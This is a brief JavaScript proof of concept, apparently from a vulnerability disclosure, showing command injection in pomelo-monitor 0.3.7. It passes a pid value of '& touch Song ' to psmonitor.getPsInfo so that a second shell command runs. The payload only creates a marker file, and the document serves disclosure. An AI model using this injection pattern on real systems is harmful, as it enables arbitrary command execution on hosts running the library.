/**
 * pomelo-monitor@0.3.7 is vulnerable to command injection.
 */

var root =require("pomelo-monitor");
var param ={
  pid: "& touch Song "
}

root.psmonitor.getPsInfo(param,function(){});


